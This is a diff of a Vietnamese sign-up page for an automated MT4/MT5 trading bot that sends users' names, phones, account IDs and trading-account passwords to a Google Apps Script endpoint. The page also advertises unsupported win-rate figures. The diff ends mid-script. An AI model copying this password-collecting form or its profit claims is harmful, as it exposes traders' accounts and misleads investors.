@@ -1,520 +1,645 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Black Gold Bot – Đăng Ký Follow Bot</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-  <style>
-    /* ── TOKENS ── */
-    :root {
-      --gold-bright:   #FFD700;
-      --gold-mid:      #C8960C;
-      --gold-deep:     #8B6914;
-      --gold-glow:     rgba(255,215,0,0.25);
-      --black-rich:    #0A0805;
-      --black-card:    rgba(10,8,5,0.82);
-      --black-input:   rgba(255,255,255,0.05);
-      --black-border:  rgba(200,150,12,0.30);
-      --text-main:     #F5E6C0;
-      --text-muted:    rgba(245,230,192,0.55);
-      --red-error:     #FF5C5C;
-      --green-ok:      #4ADE80;
-      --radius:        14px;
-      --radius-sm:     8px;
-      --transition:    0.25s ease;
-    }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Black Gold Bot – Đăng Ký</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --g1:#C8960C;--g2:#F0C040;--g3:#7A5A08;
+  --bg:#060810;--card:rgba(12,16,28,0.85);
+  --border:rgba(200,150,12,0.22);--border2:rgba(200,150,12,0.45);
+  --text:#EDE6D6;--muted:#6B6456;--dim:rgba(237,230,214,0.12);
+  --green:#22C55E;--red:#EF4444;
+  --mono:'JetBrains Mono',monospace;
+  --sans:'Space Grotesk',sans-serif;
+}
+html,body{height:100%}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:24px 16px;
+  position:relative;
+  overflow-x:hidden;
+}
 
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+/* ── CANVAS BACKGROUND ── */
+#bg-canvas{
+  position:fixed;inset:0;
+  width:100%;height:100%;
+  z-index:0;
+  pointer-events:none;
+}
 
-    body {
-      min-height: 100vh;
-      background-color: var(--black-rich);
-      background-image:
-        radial-gradient(ellipse 80% 60% at 50% 0%, rgba(200,150,12,0.18) 0%, transparent 70%),
-        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='600'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3CfeColorMatrix type='saturate' values='0'/%3E%3C/filter%3E%3Crect width='600' height='600' filter='url(%23n)' opacity='0.12'/%3E%3C/svg%3E");
-      background-size: cover, 300px 300px;
-      font-family: 'Inter', sans-serif;
-      color: var(--text-main);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 16px 60px;
-    }
+/* ── CENTER GLOW ── */
+body::after{
+  content:'';
+  position:fixed;
+  top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  width:600px;height:600px;
+  background:radial-gradient(circle, rgba(200,150,12,0.07) 0%, transparent 70%);
+  pointer-events:none;z-index:1;
+}
 
-    /* ── HEADER ── */
-    .header {
-      text-align: center;
-      margin-bottom: 36px;
-      animation: fadeDown 0.7s ease both;
-    }
+/* ── WRAPPER ── */
+.wrapper{
+  position:relative;z-index:10;
+  width:100%;max-width:460px;
+  display:flex;flex-direction:column;
+  align-items:center;gap:28px;
+}
 
-    .logo-ring {
-      width: 100px;
-      height: 100px;
-      margin: 0 auto 18px;
-      position: relative;
-    }
-    .logo-ring svg {
-      width: 100%;
-      height: 100%;
-      animation: spinRing 8s linear infinite;
-      filter: drop-shadow(0 0 14px var(--gold-mid));
-    }
-    .logo-face {
-      position: absolute;
-      inset: 14px;
-      background: linear-gradient(145deg, #C8960C, #FFD700, #8B6914);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 36px;
-    }
+/* ── LOGO AREA ── */
+.logo-area{text-align:center}
+.logo-orbit{
+  width:88px;height:88px;
+  margin:0 auto 16px;
+  position:relative;
+}
+/* outer spinning ring */
+.orbit-ring{
+  position:absolute;inset:0;
+  border-radius:50%;
+  border:1px dashed rgba(200,150,12,0.4);
+  animation:orbit 10s linear infinite;
+}
+.orbit-ring::before{
+  content:'';
+  position:absolute;
+  top:-4px;left:50%;
+  transform:translateX(-50%);
+  width:8px;height:8px;
+  border-radius:50%;
+  background:var(--g2);
+  box-shadow:0 0 12px var(--g2),0 0 24px var(--g1);
+}
+/* inner ring */
+.orbit-ring2{
+  position:absolute;inset:12px;
+  border-radius:50%;
+  border:1px solid rgba(200,150,12,0.20);
+  animation:orbit 6s linear infinite reverse;
+}
+.orbit-ring2::before{
+  content:'';
+  position:absolute;
+  bottom:-4px;left:50%;
+  transform:translateX(-50%);
+  width:6px;height:6px;
+  border-radius:50%;
+  background:var(--g1);
+  box-shadow:0 0 8px var(--g1);
+}
+/* bot face */
+.orbit-core{
+  position:absolute;inset:20px;
+  background:linear-gradient(145deg,#0e1420,#161e2e);
+  border-radius:50%;
+  border:1px solid var(--border2);
+  display:flex;align-items:center;justify-content:center;
+  font-size:22px;
+  box-shadow:inset 0 0 20px rgba(200,150,12,0.08);
+}
+@keyframes orbit{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
 
-    @keyframes spinRing {
-      from { transform: rotate(0deg); }
-      to   { transform: rotate(360deg); }
-    }
+.logo-title{
+  font-size:26px;font-weight:700;letter-spacing:.03em;
+  background:linear-gradient(90deg,var(--g3),var(--g2),#FFF5C0,var(--g2),var(--g3));
+  background-size:250%;
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  animation:shimmer 4s linear infinite;
+  margin-bottom:4px;
+}
+@keyframes shimmer{from{background-position:250%}to{background-position:-250%}}
+.logo-sub{
+  font-family:var(--mono);font-size:10px;
+  color:var(--muted);letter-spacing:.16em;text-transform:uppercase;
+}
 
-    .brand-name {
-      font-family: 'Rajdhani', sans-serif;
-      font-size: clamp(28px, 6vw, 44px);
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      background: linear-gradient(90deg, #8B6914 0%, #FFD700 35%, #FFF4C2 55%, #FFD700 75%, #8B6914 100%);
-      background-size: 200% auto;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      animation: shimmer 3s linear infinite;
-    }
+/* ── CARD ── */
+.card{
+  width:100%;
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:20px;
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  overflow:hidden;
+  box-shadow:
+    0 0 0 1px rgba(200,150,12,0.06),
+    0 40px 80px rgba(0,0,0,0.6),
+    inset 0 1px 0 rgba(255,255,255,0.04);
+}
 
-    @keyframes shimmer {
-      from { background-position: 200% center; }
-      to   { background-position: -200% center; }
-    }
+/* top accent line */
+.card::before{
+  content:'';display:block;height:1px;
+  background:linear-gradient(90deg,transparent 0%,var(--g1) 30%,var(--g2) 50%,var(--g1) 70%,transparent 100%);
+}
 
-    .brand-sub {
-      font-family: 'Rajdhani', sans-serif;
-      font-size: clamp(13px, 3vw, 16px);
-      font-weight: 500;
-      color: var(--text-muted);
-      letter-spacing: 0.20em;
-      text-transform: uppercase;
-      margin-top: 4px;
-    }
+.card-head{
+  padding:18px 24px 0;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.card-label{
+  font-family:var(--mono);font-size:10px;
+  color:var(--muted);letter-spacing:.12em;
+  text-transform:uppercase;
+}
+.live-pill{
+  display:flex;align-items:center;gap:5px;
+  font-family:var(--mono);font-size:9px;
+  color:var(--green);letter-spacing:.08em;
+  background:rgba(34,197,94,0.08);
+  border:1px solid rgba(34,197,94,0.20);
+  border-radius:20px;padding:3px 9px;
+}
+.live-dot{
+  width:5px;height:5px;border-radius:50%;
+  background:var(--green);
+  animation:pulse 2s ease infinite;
+}
+@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(34,197,94,.4)}50%{opacity:.7;box-shadow:0 0 0 4px rgba(34,197,94,0)}}
 
-    /* ── CARD ── */
-    .card {
-      width: 100%;
-      max-width: 480px;
-      background: var(--black-card);
-      border: 1px solid var(--black-border);
-      border-radius: var(--radius);
-      padding: 36px 32px 40px;
-      backdrop-filter: blur(18px);
-      box-shadow:
-        0 0 0 1px rgba(200,150,12,0.12),
-        0 20px 60px rgba(0,0,0,0.6),
-        inset 0 1px 0 rgba(255,215,0,0.1);
-      animation: fadeUp 0.7s 0.15s ease both;
-    }
+.card-body{padding:20px 24px 28px}
 
-    @keyframes fadeUp   { from { opacity:0; transform:translateY(24px); } to { opacity:1; transform:none; } }
-    @keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:none; } }
+/* ── FORM ── */
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.field{margin-bottom:14px}
 
-    .card-title {
-      font-family: 'Rajdhani', sans-serif;
-      font-size: 22px;
-      font-weight: 700;
-      letter-spacing: 0.04em;
-      color: var(--gold-bright);
-      text-align: center;
-      margin-bottom: 28px;
-      padding-bottom: 18px;
-      border-bottom: 1px solid var(--black-border);
-      position: relative;
-    }
-    .card-title::after {
-      content: '';
-      position: absolute;
-      bottom: -1px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 60px;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--gold-bright), transparent);
-    }
+label{
+  display:flex;align-items:center;gap:4px;
+  font-family:var(--mono);font-size:9px;
+  color:var(--muted);letter-spacing:.13em;
+  text-transform:uppercase;margin-bottom:6px;
+}
+.req{color:var(--g1)}
 
-    /* ── FORM ── */
-    .form-group {
-      margin-bottom: 18px;
-    }
+input,select{
+  width:100%;
+  background:rgba(255,255,255,0.025);
+  border:1px solid rgba(255,255,255,0.07);
+  border-radius:10px;
+  padding:11px 14px;
+  font-family:var(--mono);font-size:13px;
+  color:var(--text);outline:none;
+  transition:border-color .2s,box-shadow .2s,background .2s;
+  -webkit-appearance:none;
+}
+input::placeholder{color:rgba(237,230,214,0.18)}
+input:focus,select:focus{
+  border-color:rgba(200,150,12,0.55);
+  box-shadow:0 0 0 3px rgba(200,150,12,0.10);
+  background:rgba(200,150,12,0.03);
+}
+input.err{border-color:rgba(239,68,68,.45);box-shadow:0 0 0 3px rgba(239,68,68,.08)}
+select option{background:#0c1018}
 
-    label {
-      display: block;
-      font-size: 12px;
-      font-weight: 600;
-      letter-spacing: 0.10em;
-      text-transform: uppercase;
-      color: var(--text-muted);
-      margin-bottom: 7px;
-    }
-    label .req {
-      color: var(--gold-mid);
-      margin-left: 2px;
-    }
+.field-err{
+  font-family:var(--mono);font-size:9px;
+  color:var(--red);margin-top:4px;display:none;
+}
+.field-err.show{display:block}
 
-    input, select {
-      width: 100%;
-      background: var(--black-input);
-      border: 1px solid var(--black-border);
-      border-radius: var(--radius-sm);
-      padding: 12px 14px;
-      font-family: 'Inter', sans-serif;
-      font-size: 15px;
-      color: var(--text-main);
-      outline: none;
-      transition: border-color var(--transition), box-shadow var(--transition);
-      -webkit-appearance: none;
-    }
-    input::placeholder { color: var(--text-muted); }
-    input:focus, select:focus {
-      border-color: var(--gold-mid);
-      box-shadow: 0 0 0 3px rgba(200,150,12,0.18);
-    }
-    input.error, select.error {
-      border-color: var(--red-error);
-      box-shadow: 0 0 0 3px rgba(255,92,92,0.15);
-    }
-    select option { background: #1a1200; color: var(--text-main); }
+/* platform toggle */
+.plt-group{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.plt-btn{
+  padding:10px 0;border-radius:10px;
+  background:rgba(255,255,255,0.025);
+  border:1px solid rgba(255,255,255,0.07);
+  color:rgba(237,230,214,0.35);
+  font-family:var(--mono);font-size:12px;font-weight:500;
+  cursor:pointer;text-align:center;letter-spacing:.06em;
+  transition:all .2s;
+}
+.plt-btn:hover{color:var(--text);border-color:var(--border)}
+.plt-btn.on{
+  background:rgba(200,150,12,0.10);
+  border-color:rgba(200,150,12,0.50);
+  color:var(--g2);
+  box-shadow:0 0 16px rgba(200,150,12,0.10);
+}
 
-    .field-error {
-      font-size: 12px;
-      color: var(--red-error);
-      margin-top: 5px;
-      display: none;
-    }
-    .field-error.visible { display: block; }
+/* password wrap */
+.pw-wrap{position:relative}
+.pw-wrap input{padding-right:42px}
+.pw-toggle{
+  position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;
+  color:var(--muted);padding:3px;
+  display:flex;align-items:center;
+  transition:color .2s;
+}
+.pw-toggle:hover{color:var(--g2)}
 
-    /* ── PASSWORD TOGGLE ── */
-    .pass-wrap { position: relative; }
-    .pass-wrap input { padding-right: 44px; }
-    .pass-toggle {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      cursor: pointer;
-      color: var(--text-muted);
-      padding: 4px;
-      transition: color var(--transition);
-    }
-    .pass-toggle:hover { color: var(--gold-bright); }
+/* divider */
+.sep{
+  border:none;
+  border-top:1px solid var(--dim);
+  margin:18px 0;
+}
 
-    /* ── SUBMIT ── */
-    .btn-submit {
-      width: 100%;
-      margin-top: 10px;
-      padding: 14px;
-      background: linear-gradient(135deg, #8B6914 0%, #FFD700 50%, #C8960C 100%);
-      background-size: 200% 100%;
-      border: none;
-      border-radius: var(--radius-sm);
-      font-family: 'Rajdhani', sans-serif;
-      font-size: 18px;
-      font-weight: 700;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      color: #0A0805;
-      cursor: pointer;
-      position: relative;
-      overflow: hidden;
-      transition: background-position var(--transition), box-shadow var(--transition), transform var(--transition);
-      box-shadow: 0 4px 20px rgba(200,150,12,0.40);
-    }
-    .btn-submit:hover:not(:disabled) {
-      background-position: 100% 0;
-      box-shadow: 0 6px 28px rgba(255,215,0,0.55);
-      transform: translateY(-1px);
-    }
-    .btn-submit:active:not(:disabled) { transform: translateY(0); }
-    .btn-submit:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
+/* submit */
+.btn{
+  width:100%;padding:13px;margin-top:6px;
+  background:linear-gradient(105deg,var(--g3) 0%,var(--g1) 45%,var(--g2) 100%);
+  background-size:200%;
+  border:none;border-radius:10px;
+  font-family:var(--sans);font-size:14px;font-weight:700;
+  letter-spacing:.08em;text-transform:uppercase;
+  color:#060810;cursor:pointer;
+  position:relative;overflow:hidden;
+  box-shadow:0 4px 28px rgba(200,150,12,0.28);
+  transition:background-position .35s,box-shadow .35s,transform .15s;
+}
+.btn::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.14),transparent);
+  transform:translateX(-100%);transition:transform .55s;
+}
+.btn:hover:not(:disabled){
+  background-position:100%;
+  box-shadow:0 6px 36px rgba(200,150,12,0.48);
+  transform:translateY(-1px);
+}
+.btn:hover:not(:disabled)::after{transform:translateX(100%)}
+.btn:active:not(:disabled){transform:translateY(0)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.spinner{
+  display:inline-block;width:13px;height:13px;
+  border:2px solid rgba(6,8,16,.25);border-top-color:#060810;
+  border-radius:50%;animation:spin .6s linear infinite;
+  vertical-align:middle;margin-right:6px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
 
-    /* ── SPINNER ── */
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(10,8,5,0.3);
-      border-top-color: #0A0805;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      vertical-align: middle;
-      margin-right: 8px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
+/* toast */
+.toast{
+  margin-top:12px;padding:11px 14px;border-radius:10px;
+  font-family:var(--mono);font-size:11px;line-height:1.5;
+  display:none;align-items:flex-start;gap:8px;
+}
+.toast.ok{
+  display:flex;
+  background:rgba(34,197,94,0.07);
+  border:1px solid rgba(34,197,94,0.22);
+  color:var(--green);
+}
+.toast.fail{
+  display:flex;
+  background:rgba(239,68,68,0.07);
+  border:1px solid rgba(239,68,68,0.22);
+  color:var(--red);
+}
 
-    /* ── TOAST ── */
-    .toast {
-      display: none;
-      align-items: flex-start;
-      gap: 12px;
-      margin-top: 18px;
-      padding: 14px 16px;
-      border-radius: var(--radius-sm);
-      font-size: 14px;
-      line-height: 1.5;
-      animation: fadeUp 0.4s ease both;
-    }
-    .toast.success {
-      display: flex;
-      background: rgba(74,222,128,0.10);
-      border: 1px solid rgba(74,222,128,0.35);
-      color: var(--green-ok);
-    }
-    .toast.error-msg {
-      display: flex;
-      background: rgba(255,92,92,0.10);
-      border: 1px solid rgba(255,92,92,0.35);
-      color: var(--red-error);
-    }
-    .toast-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+/* secure note */
+.sec{
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  margin-top:12px;
+  font-family:var(--mono);font-size:9px;
+  color:rgba(237,230,214,0.22);letter-spacing:.06em;
+}
 
-    /* ── FOOTER ── */
-    .footer {
-      margin-top: 28px;
-      text-align: center;
-      font-size: 12px;
-      color: var(--text-muted);
-      letter-spacing: 0.04em;
-    }
+/* ── BOTTOM STATS ── */
+.stats-row{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:10px;
+  width:100%;
+}
+.stat{
+  background:rgba(12,16,28,0.7);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:12px 10px;text-align:center;
+  backdrop-filter:blur(8px);
+}
+.stat-n{
+  font-family:var(--mono);font-size:17px;font-weight:500;
+  color:var(--g2);display:block;margin-bottom:3px;
+}
+.stat-l{font-size:10px;color:var(--muted);letter-spacing:.04em}
 
-    /* ── RESPONSIVE ── */
-    @media (max-width: 520px) {
-      .card { padding: 28px 20px 32px; }
-    }
-  </style>
+@media(max-width:480px){
+  .row2{grid-template-columns:1fr}
+  .card-body{padding:16px 16px 22px}
+  .stats-row{grid-template-columns:repeat(3,1fr)}
+  .stat-n{font-size:14px}
+}
+</style>
 </head>
 <body>
 
-  <!-- HEADER -->
-  <div class="header">
-    <div class="logo-ring">
-      <!-- Rotating dashed ring -->
-      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="50" cy="50" r="46" fill="none"
-          stroke="url(#rg)" stroke-width="3"
-          stroke-dasharray="12 6" stroke-linecap="round"/>
-        <defs>
-          <linearGradient id="rg" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%"   stop-color="#8B6914"/>
-            <stop offset="50%"  stop-color="#FFD700"/>
-            <stop offset="100%" stop-color="#8B6914"/>
-          </linearGradient>
-        </defs>
-      </svg>
-      <div class="logo-face">🤖</div>
+<canvas id="bg-canvas"></canvas>
+
+<div class="wrapper">
+
+  <!-- LOGO -->
+  <div class="logo-area">
+    <div class="logo-orbit">
+      <div class="orbit-ring"></div>
+      <div class="orbit-ring2"></div>
+      <div class="orbit-core">🤖</div>
     </div>
-    <div class="brand-name">Black Gold Bot</div>
-    <div class="brand-sub">EA Trading MT4 / MT5</div>
+    <div class="logo-title">BLACK GOLD BOT</div>
+    <div class="logo-sub">EA Automated Trading · MT4 / MT5</div>
   </div>
 
-  <!-- FORM CARD -->
+  <!-- CARD -->
   <div class="card">
-    <div class="card-title">Đăng Ký Follow Bot</div>
+    <div class="card-head">
+      <span class="card-label">// Đăng ký follow bot</span>
+      <div class="live-pill"><div class="live-dot"></div>BOT LIVE</div>
+    </div>
+    <div class="card-body">
+      <form id="regForm" novalidate autocomplete="off">
 
-    <form id="regForm" novalidate autocomplete="off">
-
-      <!-- Họ tên -->
-      <div class="form-group">
-        <label for="fullname">Họ và tên <span class="req">*</span></label>
-        <input type="text" id="fullname" placeholder="Nguyễn Văn A" />
-        <div class="field-error" id="err-fullname">Vui lòng nhập họ tên</div>
-      </div>
-
-      <!-- Số điện thoại -->
-      <div class="form-group">
-        <label for="phone">Số điện thoại <span class="req">*</span></label>
-        <input type="tel" id="phone" placeholder="0901 234 567" />
-        <div class="field-error" id="err-phone">Vui lòng nhập số điện thoại</div>
-      </div>
-
-      <!-- Loại tài khoản -->
-      <div class="form-group">
-        <label for="platform">Loại tài khoản</label>
-        <select id="platform">
-          <option value="MT4">MT4</option>
-          <option value="MT5">MT5</option>
-        </select>
-      </div>
-
-      <!-- Vốn hiện tại -->
-      <div class="form-group">
-        <label for="capital">Vốn hiện tại (USD)</label>
-        <input type="text" id="capital" placeholder="Ví dụ: 500" />
-      </div>
-
-      <!-- ID tài khoản -->
-      <div class="form-group">
-        <label for="accountId">ID tài khoản giao dịch <span class="req">*</span></label>
-        <input type="text" id="accountId" placeholder="12345678" />
-        <div class="field-error" id="err-accountId">Vui lòng nhập ID tài khoản</div>
-      </div>
-
-      <!-- Password -->
-      <div class="form-group">
-        <label for="password">Mật khẩu tài khoản</label>
-        <div class="pass-wrap">
-          <input type="password" id="password" placeholder="••••••••" />
-          <button type="button" class="pass-toggle" id="passToggle" title="Hiện / Ẩn mật khẩu">
-            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-              <circle cx="12" cy="12" r="3"/>
-            </svg>
-          </button>
+        <div class="row2">
+          <div class="field">
+            <label>Họ và tên <span class="req">*</span></label>
+            <input type="text" id="fullname" placeholder="Nguyễn Văn A"/>
+            <div class="field-err" id="err-fullname">⚠ Bắt buộc</div>
+          </div>
+          <div class="field">
+            <label>Số điện thoại <span class="req">*</span></label>
+            <input type="tel" id="phone" placeholder="0901 234 567"/>
+            <div class="field-err" id="err-phone">⚠ Bắt buộc</div>
+          </div>
         </div>
-      </div>
 
-      <!-- Submit -->
-      <button type="submit" class="btn-submit" id="submitBtn">
-        Đăng ký ngay
-      </button>
+        <div class="field">
+          <label>Nền tảng giao dịch</label>
+          <div class="plt-group">
+            <button type="button" class="plt-btn on" id="btn4" data-v="MT4">MetaTrader 4</button>
+            <button type="button" class="plt-btn"    id="btn5" data-v="MT5">MetaTrader 5</button>
+          </div>
+          <input type="hidden" id="platform" value="MT4"/>
+        </div>
 
-      <!-- Toast messages -->
-      <div class="toast" id="toastSuccess">
-        <span class="toast-icon">✅</span>
-        <span>Đăng ký thành công! Chúng tôi sẽ liên hệ bạn sớm nhất.</span>
-      </div>
-      <div class="toast" id="toastError">
-        <span class="toast-icon">⚠️</span>
-        <span id="toastErrorMsg">Đã xảy ra lỗi. Vui lòng thử lại.</span>
-      </div>
+        <div class="row2">
+          <div class="field">
+            <label>Vốn hiện tại (USD)</label>
+            <input type="text" id="capital" placeholder="500"/>
+          </div>
+          <div class="field">
+            <label>Account ID <span class="req">*</span></label>
+            <input type="text" id="accountId" placeholder="12345678"/>
+            <div class="field-err" id="err-accountId">⚠ Bắt buộc</div>
+          </div>
+        </div>
 
-    </form>
+        <hr class="sep"/>
+
+        <div class="field" style="margin-bottom:0">
+          <label>
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Investor password
+          </label>
+          <div class="pw-wrap">
+            <input type="password" id="password" placeholder="••••••••••"/>
+            <button type="button" class="pw-toggle" id="pwBtn">
+              <svg id="eyeI" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <button type="submit" class="btn" id="subBtn">Kết nối &amp; Đăng ký</button>
+
+        <div class="toast" id="tOk">
+          <span>✓</span><span>Đăng ký thành công! Chúng tôi sẽ liên hệ trong 24h.</span>
+        </div>
+        <div class="toast" id="tFail">
+          <span>✗</span><span id="tMsg">Đã xảy ra lỗi. Vui lòng thử lại.</span>
+        </div>
+
+        <div class="sec">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Dữ liệu mã hoá TLS · Chỉ dùng Investor Password (read-only)
+        </div>
+
+      </form>
+    </div>
   </div>
 
-  <div class="footer">© 2025 Black Gold Bot · EA MT4/MT5</div>
+  <!-- STATS -->
+  <div class="stats-row">
+    <div class="stat"><span class="stat-n">78.4%</span><div class="stat-l">Win Rate</div></div>
+    <div class="stat"><span class="stat-n">2.41</span><div class="stat-l">Profit Factor</div></div>
+    <div class="stat"><span class="stat-n">24/7</span><div class="stat-l">Auto Trading</div></div>
+  </div>
 
-  <script>
-    // ─── CONFIG ───────────────────────────────────────────────────────────
-    // Paste your Google Apps Script Web App URL here after deploying
-    const GAS_URL = "https://script.google.com/macros/s/AKfycbwqJZXsTVfOgumWOwLM1jDB49QyGHn4U8tSEkf8N7U6_x6sTL3vHxUlSyDCO0WfgmrYeg/exec";
-    // ──────────────────────────────────────────────────────────────────────
+</div>
 
-    const form        = document.getElementById("regForm");
-    const submitBtn   = document.getElementById("submitBtn");
-    const toastOk     = document.getElementById("toastSuccess");
-    const toastErr    = document.getElementById("toastError");
-    const toastErrMsg = document.getElementById("toastErrorMsg");
-    const passInput   = document.getElementById("password");
-    const passToggle  = document.getElementById("passToggle");
-    const eyeIcon     = document.getElementById("eyeIcon");
+<script>
+const GAS_URL = "https://script.google.com/macros/s/AKfycbwqJZXsTVfOgumWOwLM1jDB49QyGHn4U8tSEkf8N7U6_x6sTL3vHxUlSyDCO0WfgmrYeg/exec";
 
-    // Password visibility
-    passToggle.addEventListener("click", () => {
-      const show = passInput.type === "password";
-      passInput.type = show ? "text" : "password";
-      eyeIcon.innerHTML = show
-        ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-           <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-           <line x1="1" y1="1" x2="23" y2="23"/>`
-        : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
-    });
+/* ── BLOCKCHAIN NETWORK CANVAS ────────────────────────── */
+const canvas = document.getElementById("bg-canvas");
+const ctx = canvas.getContext("2d");
+let W, H, nodes, animId;
 
-    // Clear error on input
-    ["fullname","phone","accountId"].forEach(id => {
-      document.getElementById(id).addEventListener("input", () => clearErr(id));
-    });
+const GOLD = "200,150,12";
+const CYAN = "34,211,238";
 
-    function setErr(id, show) {
-      const input = document.getElementById(id);
-      const err   = document.getElementById("err-" + id);
-      input.classList.toggle("error", show);
-      err.classList.toggle("visible", show);
-    }
-    function clearErr(id) { setErr(id, false); }
+function resize() {
+  W = canvas.width  = window.innerWidth;
+  H = canvas.height = window.innerHeight;
+  initNodes();
+}
 
-    function validate() {
-      let ok = true;
-      const fn = document.getElementById("fullname").value.trim();
-      const ph = document.getElementById("phone").value.trim();
-      const ai = document.getElementById("accountId").value.trim();
-      if (!fn) { setErr("fullname", true); ok = false; } else clearErr("fullname");
-      if (!ph) { setErr("phone", true); ok = false; }    else clearErr("phone");
-      if (!ai) { setErr("accountId", true); ok = false; } else clearErr("accountId");
-      return ok;
-    }
+function randBetween(a, b) { return a + Math.random() * (b - a); }
 
-    function setLoading(on) {
-      submitBtn.disabled = on;
-      submitBtn.innerHTML = on
-        ? `<span class="spinner"></span>Đang gửi...`
-        : `Đăng ký ngay`;
-    }
+function initNodes() {
+  const count = Math.floor((W * H) / 14000);
+  nodes = Array.from({length: count}, () => ({
+    x: Math.random() * W,
+    y: Math.random() * H,
+    r: randBetween(1.5, 3.5),
+    vx: randBetween(-.18, .18),
+    vy: randBetween(-.18, .18),
+    pulse: Math.random() * Math.PI * 2,
+    type: Math.random() > 0.85 ? "hub" : "node",
+  }));
+}
 
-    function hideToasts() {
-      toastOk.classList.remove("success");
-      toastErr.classList.remove("error-msg");
-    }
+const MAX_DIST = 140;
+const HUB_DIST = 200;
 
-    function showSuccess() {
-      hideToasts();
-      toastOk.classList.add("success");
-      toastOk.scrollIntoView({ behavior: "smooth", block: "nearest" });
-    }
+function draw() {
+  ctx.clearRect(0, 0, W, H);
 
-    function showError(msg) {
-      hideToasts();
-      toastErrMsg.textContent = msg || "Đã xảy ra lỗi. Vui lòng thử lại.";
-      toastErr.classList.add("error-msg");
-    }
+  /* move */
+  for (const n of nodes) {
+    n.x += n.vx; n.y += n.vy;
+    n.pulse += 0.018;
+    if (n.x < -20)  n.x = W + 20;
+    if (n.x > W+20) n.x = -20;
+    if (n.y < -20)  n.y = H + 20;
+    if (n.y > H+20) n.y = -20;
+  }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      hideToasts();
-      if (!validate()) return;
+  /* edges */
+  for (let i = 0; i < nodes.length; i++) {
+    for (let j = i + 1; j < nodes.length; j++) {
+      const a = nodes[i], b = nodes[j];
+      const dx = a.x - b.x, dy = a.y - b.y;
+      const dist = Math.sqrt(dx*dx + dy*dy);
+      const limit = (a.type === "hub" || b.type === "hub") ? HUB_DIST : MAX_DIST;
+      if (dist > limit) continue;
+      const alpha = (1 - dist / limit) * 0.28;
+      const color = (a.type === "hub" || b.type === "hub") ? GOLD : GOLD;
